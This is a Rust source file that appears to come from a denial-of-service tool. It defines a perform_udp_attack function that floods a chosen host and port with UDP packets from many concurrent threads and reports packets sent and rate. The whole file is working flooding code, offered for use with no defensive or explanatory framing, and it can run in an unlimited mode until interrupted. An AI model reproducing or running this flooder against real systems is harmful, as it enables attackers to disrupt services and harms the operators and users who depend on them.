use std::net::UdpSocket;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;
use colored::Colorize;
use indicatif::{ProgressBar, ProgressStyle};

pub fn perform_udp_attack(
    target_host: String,
    target_port: u16,
    duration: u64,
    concurrent: Option<u32>,
    delay: u64,
    payload: Option<String>,
) -> Result<(), Box<dyn std::error::Error>> {
    let target_addr = format!("{}:{}", target_host, target_port);
    let payload_bytes = payload.unwrap_or_else(|| "GLIROR UDP FLOOD".to_string()).into_bytes();
    
    println!("\n{} Starting UDP attack on: {}", "INFO".blue(), target_addr);
    println!("{} Duration: {} seconds", "INFO".blue(), if duration == 0 { "Unlimited".to_string() } else { duration.to_string() });
    println!("{} Concurrent requests: {}", "INFO".blue(), 
             concurrent.unwrap_or(if duration == 0 { 100 } else { 20 }));
    
    let requests_sent = Arc::new(AtomicU64::new(0));
    let requests_success = Arc::new(AtomicU64::new(0));
    let requests_error = Arc::new(AtomicU64::new(0));
    
    let active = Arc::new(AtomicBool::new(true));
    let active_clone = active.clone();
    
    let target_addr_clone = target_addr.clone();
    let payload_clone = payload_bytes.clone();
    let concurrent_val = concurrent.unwrap_or(if duration == 0 { 100 } else { 20 }) as usize;
    
    let pb = ProgressBar::new_spinner();
    pb.set_style(
        ProgressStyle::default_spinner()
            .template("{spinner:.green} {msg}")
            .unwrap()
    );
    
    let start_time = std::time::Instant::now();
    
    // Status reporting thread
    let status_requests_sent = requests_sent.clone();
    let status_requests_success = requests_success.clone();
    let status_requests_error = requests_error.clone();
    let pb_clone = pb.clone();
    let status_active = active.clone();
    
    let status_handle = std::thread::spawn(move || {
        loop {
            if !status_active.load(Ordering::SeqCst) {
                break;
            }
            std::thread::sleep(Duration::from_secs(1));
            
            let sent = status_requests_sent.load(Ordering::SeqCst);
            let success = status_requests_success.load(Ordering::SeqCst);
            let error = status_requests_error.load(Ordering::SeqCst);
            
            let elapsed_time = start_time.elapsed().as_secs() as f64;
            let rps = if elapsed_time > 0.0 { sent as f64 / elapsed_time } else { 0.0 };
            
            pb_clone.set_message(format!(
                "{} Sent: {}, Success: {}, Errors: {}, RPS: {:.1}",
                "STATUS:".green(),
                sent,
                success,
                error,
                rps
            ));
        }
    });
    
    // Attack threads
    let mut handles = vec![];
    
    for _ in 0..concurrent_val {
        let active_thread = active.clone();
        let target_addr_thread = target_addr_clone.clone();
        let payload_thread = payload_clone.clone();
        let requests_sent_thread = requests_sent.clone();
        let requests_success_thread = requests_success.clone();
        let requests_error_thread = requests_error.clone();
        let delay_thread = delay;
        
        let handle = std::thread::spawn(move || {
            while active_thread.load(Ordering::SeqCst) {
                match UdpSocket::bind("0.0.0.0:0") {
                    Ok(socket) => {
                        match socket.send_to(&payload_thread, &target_addr_thread) {
                            Ok(_) => {
                                requests_sent_thread.fetch_add(1, Ordering::SeqCst);
                                requests_success_thread.fetch_add(1, Ordering::SeqCst);
                            }
                            Err(_) => {
                                requests_sent_thread.fetch_add(1, Ordering::SeqCst);
                                requests_error_thread.fetch_add(1, Ordering::SeqCst);
                            }
                        }
                    }
                    Err(_) => {
                        requests_error_thread.fetch_add(1, Ordering::SeqCst);
                    }
                }
                
                if delay_thread > 0 {
                    std::thread::sleep(Duration::from_millis(delay_thread));
                }
            }
        });
        
        handles.push(handle);
    }
    
    // Wait for duration or until interrupted
    if duration > 0 {
        std::thread::sleep(Duration::from_secs(duration));
        active_clone.store(false, Ordering::SeqCst);
    } else {
        println!("\n{} UDP attack started in unlimited mode. Press Ctrl+C to stop.", "INFO".blue());
        
        // Keep running until user interrupts
        loop {
            if !active_clone.load(Ordering::SeqCst) {
                break;
            }
            std::thread::sleep(Duration::from_secs(1));
        }
    }
    
    // Wait for all threads to finish
    for handle in handles {
        let _ = handle.join();
    }
    
    // Stop the status thread
    active_clone.store(false, Ordering::SeqCst);
    let _ = status_handle.join();
    
    pb.finish_and_clear();
    
    let total_sent = requests_sent.load(Ordering::SeqCst);
    let total_success = requests_success.load(Ordering::SeqCst);
    let total_error = requests_error.load(Ordering::SeqCst);
    
    println!("\n{}", "UDP ATTACK COMPLETED".green().bold());
    println!("Total packets sent: {}", total_sent);
    println!("Successful packets: {}", total_success);
    println!("Failed packets: {}", total_error);
    
    let success_rate = if total_sent > 0 {
        (total_success as f64 / total_sent as f64) * 100.0
    } else {
        0.0
    };
    
    if total_sent > 0 {
        println!("Success rate: {:.2}%", success_rate);
        
        let elapsed_time = start_time.elapsed().as_secs() as f64;
        let avg_rps = total_sent as f64 / elapsed_time;
        println!("Average packets per second: {:.1}", avg_rps);
    }
    
    Ok(())
}